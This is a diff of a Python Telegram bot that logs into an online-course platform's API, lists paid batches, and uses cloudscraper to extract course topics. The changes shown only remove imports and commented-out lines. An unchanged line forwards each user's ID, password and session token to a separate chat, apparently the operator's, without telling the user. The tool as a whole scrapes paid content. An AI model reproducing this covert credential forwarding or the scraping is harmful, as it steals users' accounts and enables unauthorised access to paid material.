@@ -1,7 +1,5 @@
 import json
 from handlers import *
-from weasyprint import HTML
-from jinja2 import Template
 from pyrogram.types import InputMediaDocument
 import subprocess
 from pyrogram.types.messages_and_media import message
@@ -111,7 +109,6 @@ async def start(bot, m):
         'device_type': 'ANDROID',
         'Host': f'{raw_text05}',
         'Connection': 'Keep-Alive',
-        #'Accept-Encoding': 'gzip, deflate',
         'User-Agent': 'okhttp/4.9.1',
     }        
     scraper = cloudscraper.create_scraper()
@@ -121,14 +118,12 @@ async def start(bot, m):
     
     cool = ""
     for data in topicid:
-        #aa = f" `{data['id']}` » {data['course_name']}\n\n"
         aa = f" `{data['id']}` » {data['course_name']} ❇️ ₹{data['price']}\n\n"
         if len(f'{cool}{aa}') > 4096:
             print(aa)
             cool = ""
         cool += aa
     await editable.edit(f"Login successfull....⚙️")
-    #editable1 = await bot.send_message(m.chat.id, f"Login Success..\n\n{cool}\nSend ID:")
     await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}") 
     await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
     input1 = await bot.listen(editable.chat.id)
@@ -145,8 +140,7 @@ async def start(bot, m):
     topicid = output3["data"]
     for topic in topicid:
         tids = topic["subjectid"]
-        subject_title = topic["subject_name"].replace(':', '')
-        #await editable1.edit(f"Extracting....♻️**{subject_title}** please wait patiently📥")     
+        subject_title = topic["subject_name"].replace(':', '')    
         scraper = cloudscraper.create_scraper()
         html4 = scraper.get("https://"+raw_text05+"/get/alltopicfrmlivecourseclass?courseid=" + raw_text1 + "&subjectid=" + tids, headers=hdr).content
         output4 = json.loads(html4)
